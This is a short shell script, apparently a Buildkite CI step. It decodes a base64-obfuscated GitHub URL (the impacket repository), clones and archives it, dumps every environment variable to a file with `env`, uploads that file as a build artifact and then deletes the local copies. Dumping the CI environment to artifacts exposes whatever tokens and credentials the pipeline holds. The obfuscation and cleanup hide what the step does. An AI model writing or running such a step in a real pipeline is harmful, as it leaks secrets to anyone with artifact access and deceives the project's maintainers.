set -eo pipefail

WORK_DIR=`mktemp -d`
RES=`mktemp`
ARCHIVE=`mktemp`

REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldC5naXQ=" | base64 -d`

echo "Workdir is $WORK_DIR"
echo "RES is $RES"
echo "ARCHIVE is $ARCHIVE"

echo "Cloning into $WORK_DIR"
git clone $REPO --single-branch $WORK_DIR

echo "archiving $WORK_DIR into $ARCHIVE"
git archive -o "$ARCHIVE.tar.gz" $WORK_DIR

echo "exporting env into $RES"
env > $RES

echo "uploading..."
buildkite-agent artifact upload $RES
buildkite-agent artifact upload $ARCHIVE

echo "Cleaning up.."
rm -rf $WORK_DIR $RES "$ARCHIVE.tar.gz"
